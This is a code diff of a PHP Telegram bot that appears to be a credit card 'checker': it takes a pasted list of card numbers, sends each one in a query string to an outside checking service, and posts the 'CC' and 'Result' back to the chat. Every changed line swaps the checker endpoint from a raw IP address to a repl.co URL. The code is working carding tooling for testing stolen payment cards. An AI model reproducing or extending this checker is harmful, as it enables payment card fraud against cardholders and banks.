@@ -34,7 +34,7 @@ $cclist = preg_replace("/[^0-9|\n]/", "",$message);
      $array[0] = substr($array[0],0,28);
    }
   $x++;
-   $cc1 = file_get_contents('http://167.71.221.101:3000/?lista='.$array[0].'');
+   $cc1 = file_get_contents('https://oneclass.junaidrahman2.repl.co/api.php?lista='.$array[0].'');
    $msg1 = trim(strip_tags(getStr($cc1,' <br>Result:','</span><br>')));
 
    $r1 = "<b>CC : <code>$array[0]</code>%0AResult : $msg1%0A</b>";
@@ -51,7 +51,7 @@ $cclist = preg_replace("/[^0-9|\n]/", "",$message);
      $array[1] = substr($array[1],0,28);
    }
     $x++;
-   $cc2 = file_get_contents('http://167.71.221.101:3000/?lista='.$array[1].'');
+   $cc2 = file_get_contents('https://oneclass.junaidrahman2.repl.co/api.php?lista='.$array[1].'');
    $msg2 = trim(strip_tags(getStr($cc2,' <br>Result:','</span><br>')));
    $r2 = "<b>CC : <code>$array[1]</code>%0AResult : $msg2%0A</b>";
    editMessage($chatId,"%0A$r1%0A$r2%0A%0A%0AINPUT: $carry Cards %0AChecked : $x Cards ✅",$mes_id);
@@ -67,7 +67,7 @@ $cclist = preg_replace("/[^0-9|\n]/", "",$message);
      $array[2] = substr($array[2],0,28);
    }
   $x++;
-   $cc3 = file_get_contents('http://167.71.221.101:3000/?lista='.$array[2].'');
+   $cc3 = file_get_contents('https://oneclass.junaidrahman2.repl.co/api.php?lista='.$array[2].'');
    $msg3 = trim(strip_tags(getStr($cc3,' <br>Result:','</span><br>')));
    $r3 = "<b>CC : <code>$array[2]</code>%0AResult : $msg3%0A</b>";
    editMessage($chatId,"$r1%0A$r2%0A$r3%0A%0A%0AINPUT: $carry Cards %0AChecked : $x Cards ✅",$mes_id);
@@ -81,7 +81,7 @@ $cclist = preg_replace("/[^0-9|\n]/", "",$message);
      $array[3] = substr($array[3],0,28);
    }
            $x++;
-   $cc4 = file_get_contents('http://167.71.221.101:3000/?lista='.$array[3].'');
+   $cc4 = file_get_contents('https://oneclass.junaidrahman2.repl.co/api.php?lista='.$array[3].'');
    $msg4 = trim(strip_tags(getStr($cc4,' <br>Result:','</span><br>')));
    $r4 = "<b>CC : <code>$array[3]</code>%0AResult : $msg4%0A</b>";
    editMessage($chatId,"$r1%0A$r2%0A$r3%0A$r4%0A%0A%0AINPUT: $carry Cards %0AChecked : $x Cards ✅",$mes_id);
